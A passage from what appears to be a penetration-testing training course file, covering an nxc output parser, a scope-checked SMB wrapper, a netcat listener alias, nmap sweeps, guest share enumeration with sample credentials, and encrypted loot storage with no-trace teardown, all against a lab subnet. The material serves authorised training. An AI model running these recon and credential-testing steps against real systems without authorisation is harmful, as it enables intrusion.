    { t:'Script two: a parser for a tool that only speaks in colour', why:'Every tool output you cannot parse is a tool you cannot chain. Parser scripts are the highest-leverage thing you will write.', cmd:`cat > ~/tools/bin/nxc2json <<'PY'
#!/usr/bin/env python3
"""Parse netexec/nxc output from stdin into JSON lines. Usage: nxc ... | nxc2json"""
import sys, json, re
pat = re.compile(r"^(?P<proto>\\w+)\\s+(?P<ip>[0-9.]+)\\s+(?P<port>\\d+)\\s+(?P<host>\\S+)\\s+(?P<msg>.*)$")
ct = re.compile(r"\\[(?P<sign>[+*-])\\]\\s*(?P<body>.*)$")
out = []
for line in sys.stdin:
    m = pat.match(line.strip())
    if not m: continue
    d = m.groupdict(); d.pop('proto', None)
    c = ct.search(d.pop('msg'))
    d['sign'] = c.group('sign') if c else ''
    d['text'] = (c.group('body') if c else '').strip()
    if d['sign'] == '+': d['severity'] = 'hit'
    elif d['sign'] == '-': d['severity'] = 'fail'
    else: d['severity'] = 'info'
    out.append(d)
print(json.dumps(out, indent=1))
PY
chmod +x ~/tools/bin/nxc2json
printf 'SMB  192.168.56.20  445  WIN-TARGET  [+] LAB\\svc_backup:Backup2024!\nSMB  192.168.56.20  445  WIN-TARGET  [-] LAB\\bob:wrong\n' | nxc2json`, out:'[\n {\n  "ip": "192.168.56.20",\n  "severity": "hit", ...' },
    { t:'Make the parser composable', why:'Scripts that read stdin and write stdout are the whole game. They chain with everything.', cmd:`printf 'SMB  192.168.56.20  445  WIN-TARGET  [+] LAB\\\\svc_backup:Backup2024!\\n' \\
 | nxc2json | python3 -c 'import sys,json;[print(r["ip"],r["text"]) for r in json.load(sys.stdin) if r["severity"]=="hit"]'`, out:'192.168.56.20 LAB\\svc_backup:Backup2024!' },
    { t:'Script three: a customisation layer over an existing tool', why:'The real expert skill: do not rewrite tools, wrap them. A wrapper with your defaults, your logging and your scope check.', cmd:`cat > ~/tools/bin/zsmb <<'SH'
#!/usr/bin/env bash
# zsmb TARGET [-u USER -p PASS] — scoped, logged nxc smb wrapper with my defaults
set -euo pipefail
SCOPE="$HOME/engagements/current/scope.txt"
T="\${1:?usage: zsmb TARGET [-u USER -p PASS]}"; shift || true
if [ -f "$SCOPE" ] && ! grep -qE "(^|[^0-9.])\${T%%/*}([^0-9.]|$)" "$SCOPE"; then
  echo "[!] $T is NOT in $SCOPE — refusing (add it explicitly if authorised)" >&2; exit 3
fi
LOG="$HOME/engagements/current/log/smb-$(date +%Y%m%d-%H%M%S).log"
mkdir -p "$(dirname "$LOG")"
echo "[*] zsmb $T (scope OK) -> $LOG" | tee -a "$LOG"
nxc smb "$T" --timeout 5 --jitter 1 "$@" 2>&1 | tee -a "$LOG" | nxc2json
SH
chmod +x ~/tools/bin/zsmb
mkdir -p ~/engagements/current/log && printf '192.168.56.0/24\n' > ~/engagements/current/scope.txt
zsmb 192.168.56.20 -u guest -p '' --shares | head -20`, out:'[*] zsmb 192.168.56.20 (scope OK) -> .../smb-....log' },
    { t:'Add shell ergonomics that pay for themselves', why:'Aliases and a tmux layout are not decoration. They are how you avoid retyping the same six command lines 200 times.', cmd:`mkdir -p ~/.config/zothpen
cat > ~/.config/zothpen/aliases <<'SH'
# --- zothpen aliases: source from ~/.bashrc ---
alias ll='ls -lah --group-directories-first'
alias rl='rlwrap -cAr nc'                  # usable netcat listener
alias tmuxz='tmux new -A -s zothpen'
alias pxy='proxychains4 -q'
alias lh='history | grep -i'
alias ports='ss -tulpn'
alias serve='python3 -m http.server 8000'
# engagement shortcuts, expand in a subshell so they do not leak
alias svcscan='lh'
export HISTCONTROL=ignoreboth:erasedups
export HISTSIZE=100000
export HISTTIMEFORMAT='%Y-%m-%d %H:%M:%S  '
SH
echo 'source ~/.config/zothpen/aliases' >> ~/.bashrc
cat > ~/.config/zothpen/tmux.conf <<'CONF'
set -g mouse on
set -g history-limit 50000
set -g base-index 1
setw -g pane-base-index 1
bind | split-window -h -c "#{pane_current_path}"
bind - split-window -v -c "#{pane_current_path}"
bind r source-file ~/.tmux.conf \\; display "reloaded"
CONF
echo 'source-file ~/.config/zothpen/tmux.conf' >> ~/.tmux.conf
echo "aliases+tmux installed"`, out:'aliases+tmux installed' },
    { t:'Test that history is not leaking your credentials', why:'The single most common self-inflicted OPSEC failure. Fix it deliberately.', cmd:`# Prefix sensitive commands with a space (HISTCONTROL=ignoreboth drops it):
nxc smb 192.168.56.20 -u alice -p 'Password1'
history 5 | grep -i 'Password1' && echo "LEAKING" || echo "clean (leading space or ignorspace works)"`, out:'clean (leading space or ignorspace works)' },
    { t:'Commit, tag and document the toolkit', why:'Your toolkit is a project. A README that says what each script does is what makes it usable six months from now.', cmd:`cd ~/tools
cat > README.md <<'MD'
# zothpen toolkit
| script | purpose | input |
|---|---|---|
| zrecon | sweep -> full-port -> -sV -sC, logs everything | IP or CIDR |
| nxc2json | turn nxc/netexec colour output into JSON (stdin->stdout) | stdin |
| zsmb | scope-checked, logged nxc smb wrapper with sane defaults | target |
Configured: ~/.config/zothpen/{aliases,tmux.conf}, sourced from rc files.
MD
git add -A && git -c user.email=z@local -c user.name=zothpen commit -qm 'toolkit: zrecon, nxc2json, zsmb, shell ergonomics'
git log --oneline; ls -l bin/`, out:'* toolkit: zrecon, nxc2json, zsmb, shell ergonomics' }
  ],
  verify:[
    'zrecon runs end to end against your lab range and produces services.txt',
    'nxc2json chains with a one-line python consumer and prints only hits',
    'zsmb refuses an out-of-scope target and logs an in-scope one',
    '~/tools is a git repository with a commit and a README table'
  ],
  pitfalls:[
    'Writing a 900-line framework before you have a working 20-line script. Small, tested, chained beats big and broken.',
    'Hard-coding your LHOST/target into a script that goes on GitHub. Parameterise everything; commit no engagement data.',
    'Skipping the scope check in a wrapper. A wrapper that makes you faster at attacking the wrong host has negative value.'
  ],
  hint:'The pattern for every script you will ever write here: read stdin or one argument, log to a timestamped file, write parseable output to stdout, refuse out-of-scope input, and exit non-zero on failure so it chains.',
  tools:['t-bash','t-python','t-git','t-tmux'] },

{ id:'lab-zothpen-op', title:'Sovereign Red-Team Op: ZothPen & ZothPen-Lite Scenario', mod:'m01', diff:'med', os:'zothpen / any', time:'60 min', xp:120,
  goal:'Execute a complete zero-trace engagement workflow combining terminal recon, Chain of Thoughts hypothesis branching, Vaelor zero-knowledge loot storage, and amnesic teardown across ZothPen, ZothPen-Lite, or any Linux OS.',
  scenario:'You have been contracted to assess an isolated lab enclave (192.168.56.0/24 and lab.local) with strict data-handling rules: no unencrypted loot may touch persistent disk, every hypothesis must be logged with verifiable evidence for the final audit report, and all tooling must work identically whether you are booted into the ZothPen Amnesic Live ISO, working inside ZothPen-Lite (zothos.nullai.tech), or running Kali/Parrot/Linux.',
  requires:['ZothPen Live ISO, ZothPen-Lite (zothos.nullai.tech), or any Kali/Parrot/Linux host','A local target VM or Docker container on 192.168.56.0/24 or 127.0.0.1'],
  steps:[
    { t:'Verify RAM-only workspace & egress isolation', why:'On ZothPen Live ISO (toram), everything runs in volatile memory. On Kali, Parrot, or Ubuntu, mounting or using /dev/shm gives you the same RAM-backed scratchpad so sensitive recon outputs never hit swap or NVMe blocks.', cmd:`# Works on ZothPen Live ISO, Kali, Parrot, Debian, Ubuntu, Arch:
mkdir -p /dev/shm/zothpen-op/{recon,scans,loot,evidence} && chmod 700 /dev/shm/zothpen-op
df -hT /dev/shm/zothpen-op
# On ZothPen Live ISO: check toram boot & nftables Tor switch status
grep -o 'toram' /proc/cmdline 2>/dev/null || echo "standard-linux: using /dev/shm RAM tmpfs"`, out:'tmpfs          tmpfs     7.8G  0  7.8G   0% /dev/shm', note:'In ZothPen-Lite (zothos.nullai.tech), open the Terminal or Pentesting Dojo — all state is sandboxed locally in your browser with zero external network calls.' },
    { t:'Initialize the Chain of Thoughts (CoT) reasoning session', why:'Ad-hoc notes lose track of dead ends. Using Chain of Thoughts (via MCP or CLI/Web Studio in ZothPen-Lite) records a verifiable Directed Acyclic Graph (DAG) of observations, hypotheses, and verified proofs.', cmd:`# In ZothPen-Lite Chain of Thoughts Studio or MCP CLI:
#   cot_init_session(goal="Assess 192.168.56.0/24 enclave & web surface")
#   cot_push_thought(type="observation", content="Scope confirmed: 192.168.56.0/24, window 09:00-17:00")
# On any POSIX shell, log the structured JSONL trace alongside your session:
cat > /dev/shm/zothpen-op/evidence/cot-trace.jsonl <<'JSON'
{"id":"T1","type":"observation","text":"Scope verified: 192.168.56.0/24 host-only enclave","status":"verified"}
{"id":"T2","type":"hypothesis","parent":"T1","branch":"H-WEB","text":"Port 80/8080 exposes legacy admin API","status":"active"}
{"id":"T3","type":"hypothesis","parent":"T1","branch":"H-SMB","text":"Port 445 permits null/guest share listing","status":"active"}
JSON
wc -l /dev/shm/zothpen-op/evidence/cot-trace.jsonl`, out:'3 /dev/shm/zothpen-op/evidence/cot-trace.jsonl' },
    { t:'Run fast two-stage discovery against the lab subnet', why:'Sweep all ports fast first, then interrogate only the open ports with service scripts. Identical across ZothPen, Kali, Parrot, and any Linux distro with nmap.', cmd:`nmap -sn -n 192.168.56.0/24 -oG /dev/shm/zothpen-op/scans/sweep.gnmap
grep -oE '^Host: [0-9.]+' /dev/shm/zothpen-op/scans/sweep.gnmap | awk '{print $2}' > /dev/shm/zothpen-op/scans/hosts.txt
sudo nmap -sS -p- --min-rate 2000 -n -iL /dev/shm/zothpen-op/scans/hosts.txt -oG /dev/shm/zothpen-op/scans/open.gnmap
grep -oE '[0-9]+/open/tcp' /dev/shm/zothpen-op/scans/open.gnmap | cut -d/ -f1 | sort -un | paste -sd,`, out:'22,80,445,3306,8080' },
    { t:'Validate hypotheses & update the Chain of Thoughts graph', why:'Test each branch (H-SMB and H-WEB) with minimal noise, then mark the hypothesis verified or refuted.', cmd:`# Branch H-SMB: check SMB signing & guest share access
netexec smb 192.168.56.20 -u 'guest' -p '' --shares | tee /dev/shm/zothpen-op/scans/smb-shares.txt
# Branch H-WEB: inspect HTTP headers & API endpoints
curl -sSI http://192.168.56.20:8080/api/v1/health | head -n 5
# Record verification in Chain of Thoughts:
echo '{"id":"T4","type":"verification","parent":"T3","status":"verified","evidence":"READ access on //192.168.56.20/backups"}' >> /dev/shm/zothpen-op/evidence/cot-trace.jsonl`, out:'SMB  192.168.56.20  445  LAB-NODE  [+] Guest session  READ: backups' },
    { t:'Seal recovered artifacts in Vaelor Zero-Knowledge Vault', why:'Plaintext hashes or config dumps on disk violate engagement OPSEC. Seal them with authenticated encryption (AES-256-GCM / Argon2id in ZothPen & ZothPen-Lite Vaelor, or GPG/OpenSSL on standard Linux).', cmd:`# In ZothPen / ZothPen-Lite: drop artifact into Vaelor Vault (Argon2id + AES-256-GCM + Ed25519 signature)
# Universal POSIX Linux equivalent (AES-256-CBC PBKDF2 / GPG symmetric):
tar -czf - -C /dev/shm/zothpen-op loot evidence \\
  | openssl enc -aes-256-cbc -pbkdf2 -iter 600000 -salt -out ~/engagement-vault.enc
ls -lh ~/engagement-vault.enc`, out:'-rw------- 1 zoth zoth 4.2K Oct 27 12:00 /home/zoth/engagement-vault.enc' },
    { t:'Export the audit report & execute clean-slate teardown', why:'Leave zero unencrypted residue behind once the encrypted deliverable is archived.', cmd:`# Export Chain of Thoughts summary to Markdown:
python3 -c 'import json; [print(f"- **[{r[\"id\"]}] ({r[\"type\"]})**: {r.get(\"text\",r.get(\"evidence\",\"\"))} [{r[\"status\"]}]") for r in map(json.loads, open("/dev/shm/zothpen-op/evidence/cot-trace.jsonl"))]'
# Wipe the volatile RAM workspace:
rm -rf /dev/shm/zothpen-op && echo "RAM workspace purged clean"`, out:'- **[T1] (observation)**: Scope verified: 192.168.56.0/24 host-only enclave [verified]\n...\nRAM workspace purged clean' }
  ],
  verify:[
    'All temporary recon and scan files were written to /dev/shm (RAM tmpfs) or ZothPen toram overlay',
    'At least two hypotheses were branched and verified/refuted in your Chain of Thoughts trace',
    'Recovered loot and evidence were sealed into an encrypted archive before teardown',
    'The unencrypted /dev/shm/zothpen-op workspace was cleanly removed after archiving'
  ],
  pitfalls:[
    'Running high-rate nmap SYN scans while transparent Tor routing (zoth-tor-switch or anonsurf) is active.',
    'Leaving plaintext credential dumps in ~/Downloads or ~/.bash_history after the engagement ends.',
    'Skipping hypothesis logging during enumeration and trying to reconstruct the attack path from memory days later.'
  ],
  hint:'You can practice the exact same workflow with zero VM setup right inside ZothPen-Lite (https://zothos.nullai.tech) using the built-in Pentesting Dojo, Chain of Thoughts Studio, and Vaelor Vault windows.',
  tools:['t-zothpen','t-cot','t-nmap','t-netexec'] }

);
